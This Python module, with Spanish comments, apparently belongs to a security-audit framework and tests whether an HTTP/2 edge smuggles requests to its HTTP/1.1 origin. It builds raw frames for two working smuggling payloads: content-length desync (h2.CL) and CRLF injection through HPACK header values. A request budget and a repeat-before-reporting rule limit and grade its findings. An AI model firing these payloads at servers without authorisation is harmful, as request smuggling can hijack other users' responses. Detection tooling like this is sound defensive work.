#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
v0.88.0 H2-TRANSLATION (Parser Differential)
============================================
Familia h2.CL / inyeccion H1 por HPACK leniente, con la
disciplina de la linea DESYNC: contratos pre-registrados en
el ExperimentGraph, juez determinista, presupuesto bajo y
cero-FP por diseno.

Mecanica H2-TRANSLATION: el edge traduce HTTP/2 -> HTTP/1.1.
Dos bugs de traduccion clasicos:
  h2.CL   el edge reenvia TODOS los DATA frames ignorando el
          content-length del origin: el origin consume CL
          bytes y procesa el residual como request invisible.
  H-INJ   el traductor copia verbatim un valor de header con
          CRLF: el origin parsea una request extra escondida
          en el header block.

Oraculo observable (nada inferido): la ATRIBUCION de
respuestas por stream. En H2 cada request tiene su stream:
  A  el stream del followup recibe el eco del token del
     followup      -> traduccion alineada (BENIGN).
  B  el stream del followup recibe SMUGGLE-ECHO del token
     smuggleado   -> el origin proceso bytes que el edge no
     contabiliza  -> MISMATCH observable.
  S  cadena: el segundo followup recibe el eco del primero
     -> la coleccion queda desplazada (STATE EFFECT).
  R  RST_STREAM/GOAWAY del edge ante smuggle -> frontera
     estricta (BENIGN, no desync).

Regla heredada (v0.87): el eco del token SOLO no es desync;
sin desalineacion observable, el veredicto NO escala. Sin
repro 2/2 no hay DESYNC.

Contratos (pre-registrados):
  baseline: C0 GET control (firma de eco propio);
            C1 POST vacio + followup alineado (si el
            followup no matchea C0: UNSTABLE).
  variante (bateria h2.CL o H-INJ, 1 endpoint):
    P  probe en conexion fresca (POST smuggleado + fb + fc)
    R  repro idem en conexion nueva

Escalera determinista:
  BENIGN -> H2-DETECTED (1/2, probable, NO reportable)
  -> H2-DESYNC (repro 2/2)
  -> H2-STATE-EFFECT (ademas coleccion desplazada)
  (+ BENIGN-EDGE / UNSTABLE / UNREACHABLE / UNKNOWN)

Presupuesto: 2 baseline + 1 variante x 2 fases x 3 reqs
= max 8 requests. Read-only: el smuggle es un GET propio con
token unico, jamas recursos de terceros.

Aprendizaje RC-000217: los payloads son BYTES crudos jamas
repr(b'..'); la carga HPACK va en 0x00-literal sin huffman.
"""

import argparse
import hashlib
import json
import os
import socket
import struct
import sys
import time
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import experiment_graph as xg          # noqa: E402

MODULE_VERSION = "0.88.0"

# ---- clases de evidencia v0.88 -------------------------------------
E_H2_SIGNAL = "E-H2-SIGNAL"
E_H2_STATE = "E-H2-STATE"

HYPOTHESES = [
    ("H-H2CL",
     "el traductor h2->h1 reenvia DATA mas alla del "
     "content-length y el origin procesa el residual"),
    ("H-HINJ",
     "el traductor copia verbatim valores HPACK con CRLF "
     "y el origin parsea requests inyectadas"),
    ("H-SHIFT",
     "la coleccion de respuestas queda desplazada entre "
     "streams: el cliente recibe respuestas ajenas"),
]

BRANCHES = {
    # fb recibe su propio eco: traducion alineada
    "aligned": {"inconclusive": ["H-H2CL", "H-HINJ",
                                 "H-SHIFT"]},
    # RST/GOAWAY del edge: frontera estricta, no desync
    "edge-strict": {"inconclusive": ["H-H2CL", "H-HINJ"],
                    "nota": "el edge rechazo el smuggle "
                            "antes del origin: sin "
                            "desalineacion observable"},
    # desync observable sin repro 2/2
    "detected-norepro": {"supports": ["H-H2CL", "H-HINJ"],
                         "clase": E_H2_SIGNAL,
                         "tag": "OBSERVED",
                         "inconclusive": ["H-SHIFT"]},
    # repro 2/2: MISMATCH confirmado en esta familia
    "desync-repro": {"supports": ["H-H2CL", "H-HINJ"],
                     "clase": E_H2_SIGNAL,
                     "tag": "OBSERVED"},
    # ademas la coleccion queda desplazada (observable)
    "state-effect": {"supports": ["H-H2CL", "H-HINJ",
                                  "H-SHIFT"],
                     "clase": E_H2_STATE,
                     "tag": "OBSERVED"},
}

SPECTRUM = [
    [("H-H2CL", "INCONCLUSIVE")],
    [("H-H2CL", "SUPPORT")],
    [("H-SHIFT", "SUPPORT")],
]

# ---- presupuesto anti-DoS -------------------------------------------
BASELINE_PROBES = 2
MAX_VARIANTS = 1
PHASES = ("P", "R")
PROBE_TIMEOUT = 8.0

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FRAME_DATA = 0x0
FRAME_HEADERS = 0x1
FRAME_RST = 0x3
FRAME_SETTINGS = 0x4
FRAME_GOAWAY = 0x7
F_END_STREAM = 0x1
F_END_HEADERS = 0x4
S_ACK = 0x1

BATTERY = ("h2cl", "hinj")


def _token():
    return uuid.uuid4().hex[:12]


def _hash(b):
    return hashlib.sha256(b).hexdigest()[:16]


# ---- mini-cliente H2 (subconjunto literal, sin huffman) -----------

def _frame(ftype, flags, sid, payload):
    return (struct.pack(">I", len(payload))[1:]
            + struct.pack(">BB", ftype, flags)
            + struct.pack(">I", sid & 0x7FFFFFFF)
            + payload)


def _hpack_literal(headers):
    out = b""
    for name, value in headers:
        n = name.encode() if isinstance(name, str) else name
        v = (value.encode() if isinstance(value, str)
             else value)
        out += b"\x00" + bytes([len(n) & 0x7F]) + n
        out += bytes([len(v) & 0x7F]) + v
    return out


def _req_frames(sid, method, path, extra_headers=(),
                body=b"", end_stream=True):
    """Frames de UN request H2: HEADERS (+DATA si hay body).
    BYTES crudos (lecciones RC-000217): jamas repr()."""
    headers = [(":method", method),
               (":path", path),
               (":scheme", "http"),
               (":authority", "h2target")]
    headers += list(extra_headers)
    flags = F_END_HEADERS
    if not body and end_stream:
        flags |= F_END_STREAM
    out = _frame(FRAME_HEADERS, flags, sid,
                 _hpack_literal(headers))
    if body:
        out += _frame(FRAME_DATA,
                      F_END_STREAM if end_stream else 0,
                      sid, body)
    return out


def _h2_connect(host, port, timeout=PROBE_TIMEOUT,
                use_tls=False):
    """Socket al blanco; TLS+ALPN h2 para validacion en
    vivo. El lab usa plain sockets."""
    s = socket.create_connection((host, port), timeout)
    if use_tls:
        import ssl
        ctx = ssl.create_default_context()
        ctx.set_alpn_protocols(["h2"])
        s = ctx.wrap_socket(s, server_hostname=host)
    s.settimeout(timeout)
    s.sendall(PREFACE
              + _frame(FRAME_SETTINGS, 0, 0, b""))
    return s


class H2Reader(object):
    """Lector de frames con buffer PERSISTENTE por conexion:
    HEADERS+DATA llegan juntos en un segmento TCP y ningun
    byte puede descartarse entre frames (leccion v0.88)."""

    def __init__(self, s):
        self.s = s
        self.buf = b""

    def _need(self, n):
        while len(self.buf) < n:
            d = self.s.recv(65535)
            if not d:
                return False
            self.buf += d
        return True

    def read_frame(self):
        """(type, flags, sid, payload) o None; drena y
        ACKea SETTINGS sin devolverlos."""
        while True:
            if not self._need(9):
                return None
            ln = struct.unpack(
                ">I", b"\x00" + self.buf[:3])[0]
            ftype, flags = self.buf[3], self.buf[4]
            sid = struct.unpack(
                ">I", self.buf[5:9])[0]
            if not self._need(9 + ln):
                return None
            payload = self.buf[9:9 + ln]
            self.buf = self.buf[9 + ln:]
            if ftype == FRAME_SETTINGS:
                if not (flags & S_ACK):
                    self.s.sendall(_frame(
                        FRAME_SETTINGS, S_ACK, 0, b""))
                continue
            return ftype, flags, sid, payload

    def read_stream_body(self, sid, cap=65535):
        """Lee HEADERS(+DATA) del stream hasta END_STREAM.
        Devuelve (status, body); status RST/GOAWAY si el
        edge corto el stream."""
        status, body = None, b""
        while True:
            fr = self.read_frame()
            if fr is None:
                if status:
                    return status, body
                return None, None
            ftype, flags, fsid, payload = fr
            if ftype == FRAME_RST:
                if fsid == sid:
                    return ("RST", None)
                continue
            if ftype == FRAME_GOAWAY:
                return ("GOAWAY", None)
            if ftype == FRAME_HEADERS and fsid == sid:
                # subconjunto literal: buscar :status
                if payload[:1] == b"\x00":
                    i = 1
                    nlen = payload[i]; i += 1
                    i += nlen
                    vlen = payload[i]; i += 1
                    status = payload[i:i + vlen].decode(
                        "latin-1", "replace")
                if flags & F_END_STREAM:
                    return status, body
                continue
            if ftype == FRAME_DATA and fsid == sid:
                body += payload
                if flags & F_END_STREAM:
                    return status, body
                if len(body) > cap:
                    return status, body


# ---- requests del presupuesto ------------------------------------

def _get_query(token):
    return "/?h2fa=%s" % token


def _post_h2cl_frames(host, token, fb, fc):
    """Bateria h2.CL: POST con content-length: 0 cuyo DATA
    lleva el prefijo smuggleado (GET propio con token)."""
    smuggle = ("GET /%s HTTP/1.1\r\n"
               "Host: h2target\r\n\r\n" % token).encode()
    f_post = _req_frames(
        1, "POST", "/", (("content-length", "0"),),
        body=smuggle)
    f_fb = _req_frames(3, "GET", "/?h2fb=%s" % fb)
    f_fc = _req_frames(5, "GET", "/?h2fc=%s" % fc)
    return f_post + f_fb + f_fc


def _post_hinj_frames(host, token, fb, fc):
    """Bateria H-INJ: el smuggle viaja DENTRO de un valor
    HPACK con CRLF (\\r\\n\\r\\n temprano cierra el header
    block del origin)."""
    inj = ("\r\n\r\nGET /%s HTTP/1.1\r\n"
           "Host: h2target\r\n\r\n" % token).encode()
    f_post = _req_frames(
        1, "POST", "/",
        (("content-length", "0"),
         ("x-h2-quiet", inj)),
        body=b"")
    f_fb = _req_frames(3, "GET", "/?h2fb=%s" % fb)
    f_fc = _req_frames(5, "GET", "/?h2fc=%s" % fc)
    return f_post + f_fb + f_fc


def _probe(host, port, battery, phase, timeout=PROBE_TIMEOUT,
           use_tls=False):
    """Una fase completa en conexion fresca. Devuelve dict
    de observaciones crudas (nada inferido)."""
    token = _token()
    fb = _token()
    fc = _token()
    if battery == "h2cl":
        frames = _post_h2cl_frames(host, token, fb, fc)
    else:
        frames = _post_hinj_frames(host, token, fb, fc)

    s = _h2_connect(host, port, timeout, use_tls)
    rd = H2Reader(s)
    obs = {"phase": phase, "token": token,
           "fb": fb, "fc": fc}
    try:
        s.sendall(frames)
        st0, b0 = rd.read_stream_body(1)   # POST
        st1, b1 = rd.read_stream_body(3)   # fb
        st2, b2 = rd.read_stream_body(5)   # fc
        obs["post"] = (st0, b0.decode(
            "latin-1", "replace") if b0 else "")
        obs["fb_resp"] = (st1, b1.decode(
            "latin-1", "replace") if b1 else "")
        obs["fc_resp"] = (st2, b2.decode(
            "latin-1", "replace") if b2 else "")
    except (socket.timeout, OSError) as e:
        obs["error"] = repr(e)
    finally:
        try:
            s.close()
        except OSError:
            pass
    return obs


def _baseline(host, port, timeout=PROBE_TIMEOUT,
              use_tls=False):
    """C0 GET control (eco propio) y C1 POST vacio +
    followup alineado, en conexiones frescas."""
    res = {}
    tok = _token()
    s = _h2_connect(host, port, timeout, use_tls)
    rd = H2Reader(s)
    try:
        s.sendall(_req_frames(1, "GET", _get_query(tok)))
        st, b = rd.read_stream_body(1)
        res["c0"] = ("ECHO %s" % tok) == (
            b.decode("latin-1", "replace")
            if b else "")
    except (socket.timeout, OSError):
        res["c0"] = False
    finally:
        try:
            s.close()
        except OSError:
            pass

    fb = _token()
    s = _h2_connect(host, port, timeout, use_tls)
    rd = H2Reader(s)
    try:
        s.sendall(_req_frames(
            1, "POST", "/",
            (("content-length", "0"),), body=b""))
        s.sendall(_req_frames(3, "GET", "/?h2fb=%s" % fb))
        st0, b0 = rd.read_stream_body(1)
        st1, b1 = rd.read_stream_body(3)
        res["c1_post"] = (st0 == "200")
        res["c1_fb"] = ("ECHO %s" % fb) == (
            b1.decode("latin-1", "replace")
            if b1 else "")
    except (socket.timeout, OSError):
        res["c1_fb"] = False
    finally:
        try:
            s.close()
        except OSError:
            pass
    return res


def _register(g, exp_id, proc, hids, budget):
    g.register_experiment({
        "id": exp_id, "process": proc,
        "hypotheses": hids,
        "budget": {"max_requests": budget,
                   "policy": "anti-DoS"},
        "preregistration": True})


def _obs(g, exp_id, pid, phase, o):
    g.add_observation(exp_id, pid, {
        "phase": phase, "observable": o,
        "ts": time.time()})


def h2_audit(cfg):
    """Auditoria H2-TRANSLATION de un blanco. cfg: url (host
    O url http), battery ('h2cl'|'hinj'). Veredicto
    determinista con escalera cero-FP."""
    host = cfg.get("host")
    port = cfg.get("port")
    url = cfg.get("url", "")
    use_tls = url.startswith("https://")
    if not host and url:
        u = url.split("://", 1)[-1]
        host = u.split("/")[0].split(":")[0]
        if ":" in u.split("/")[0]:
            try:
                port = int(u.split("/")[0].split(":")[1])
            except ValueError:
                pass
    port = port or 443
    battery = cfg.get("battery", "h2cl")
    if battery not in BATTERY:
        battery = "h2cl"

    informe = {
        "module": "h2_translation", "version": MODULE_VERSION,
        "battery": battery, "url": url or
        "http://%s:%s" % (host, port),
        "verdict": "UNKNOWN", "reasons": [],
        "requests": 0,
        "evidence": {},
    }

    try:
        g = xg.seed("h2_translation_%s" % battery)
    except Exception:
        g = None

    exp_id = "H2T-%s" % battery.upper()
    proc = ("medir desalineacion de coleccion h2->h1 "
            "por atribucion de stream (%s)" % battery)
    hids = [h[0] for h in HYPOTHESES]
    if g:
        _register(g, exp_id, proc, hids,
                   BASELINE_PROBES + MAX_VARIANTS * 2 * 3)

    # reachability
    try:
        s = _h2_connect(host, port, PROBE_TIMEOUT,
                        use_tls)
        s.close()
    except (socket.timeout, OSError) as e:
        informe["verdict"] = "UNREACHABLE"
        informe["reasons"].append(repr(e))
        return informe

    # baseline: 2 conexiones
    b = _baseline(host, port, use_tls=use_tls)
    informe["requests"] += 2
    if g:
        _obs(g, exp_id, "B", "baseline", b)
    if not b.get("c0"):
        informe["verdict"] = "UNSTABLE"
        informe["reasons"].append(
            "C0 control sin eco propio")
        return informe
    if not (b.get("c1_post") and b.get("c1_fb")):
        informe["verdict"] = "UNSTABLE"
        informe["reasons"].append(
            "C1 POST vacio desalineado sin smuggle")
        return informe

    resultados = []
    for phase in PHASES:
        o = _probe(host, port, battery, phase, use_tls=use_tls)
        informe["requests"] += 3
        if g:
            _obs(g, exp_id, "P" if phase == "P" else "R",
                 phase, o)
        resultados.append(o)

    def _interp(o):
        """Clasifica UNA fase por observables puros."""
        if "error" in o:
            return "unknown", [o["error"]]
        st1, b1 = o["fb_resp"]
        st2, b2 = o["fc_resp"]
        tok, fb, fc = o["token"], o["fb"], o["fc"]
        rs = []
        if st1 in ("RST", "GOAWAY"):
            # el edge corto antes de que el origin vea
            # algo: frontera estricta
            return "edge-strict", ["%s en fb" % st1]
        want = "ECHO %s" % fb
        if b1 == want:
            return "aligned", ["fb alineado"]
        if b1 == "SMUGGLE-ECHO %s" % tok:
            rs.append("fb recibio eco del smuggle")
            if b2 == want:
                rs.append("fc recibio eco de fb: "
                          "coleccion desplazada")
                return "state-effect", rs
            return "desync", rs
        rs.append("fb=%r st=%s" % (b1[:48], st1))
        return "unknown", rs

    inter = [_interp(o) for o in resultados]
    for ph, (kind, rs) in zip(PHASES, inter):
        informe["reasons"] += ["%s: %s" % (ph, r)
                              for r in rs]
        informe["evidence"][ph] = kind

    ka, kb = inter[0][0], inter[1][0]
    if ka == "aligned" and kb == "aligned":
        informe["verdict"] = "BENIGN"
        informe["reasons"].append(
            "ambas fases alineadas")
    elif "edge-strict" in (ka, kb):
        informe["verdict"] = "BENIGN-EDGE"
        informe["reasons"].append(
            "el edge rechazo el smuggle: sin desync")
    elif ka == "state-effect" and kb == "state-effect":
        informe["verdict"] = "H2-STATE-EFFECT"
        informe["evidence"]["class"] = E_H2_STATE
    elif ka in ("desync", "state-effect") \
            and kb in ("desync", "state-effect"):
        informe["verdict"] = "H2-DESYNC"
        informe["evidence"]["class"] = E_H2_SIGNAL
    elif ka in ("desync", "state-effect") \
            or kb in ("desync", "state-effect"):
        informe["verdict"] = "H2-DETECTED"
        informe["reasons"].append(
            "sin repro 2/2: NO reportable")
        informe["evidence"]["class"] = E_H2_SIGNAL
    else:
        informe["verdict"] = "UNKNOWN"

    if g:
        tag = {"H2-DESYNC": "desync-repro",
               "H2-STATE-EFFECT": "state-effect",
               "H2-DETECTED": "detected-norepro",
               "BENIGN": "aligned",
               "BENIGN-EDGE": "edge-strict",
               }.get(informe["verdict"])
        if tag and tag in BRANCHES:
            xg.apply(g, [
                (h, "SUPPORT" if BRANCHES[tag].get(
                    "supports", []).count(h)
                 else ("INCONCLUSIVE"
                       if h in BRANCHES[tag].get(
                    "inconclusive", []) else "NONE"))
                for h in hids])
    return informe


def main():
    ap = argparse.ArgumentParser(
        description="v0.88 H2-TRANSLATION audit")
    ap.add_argument("--url", required=True,
                    help="http://host:port del blanco")
    ap.add_argument("--battery",
                    choices=BATTERY, default="h2cl")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    inf = h2_audit({"url": a.url, "battery": a.battery})
    if a.json:
        print(json.dumps(inf, indent=2, ensure_ascii=False))
    else:
        print("[%s] veredicto: %s" % (
            inf["battery"], inf["verdict"]))
        for r in inf["reasons"]:
            print("  - %s" % r)
        print("  requests: %d" % inf["requests"])
    return 0 if inf["verdict"] not in (
        "UNKNOWN", "UNREACHABLE", "UNSTABLE") else 1


if __name__ == "__main__":
    sys.exit(main())
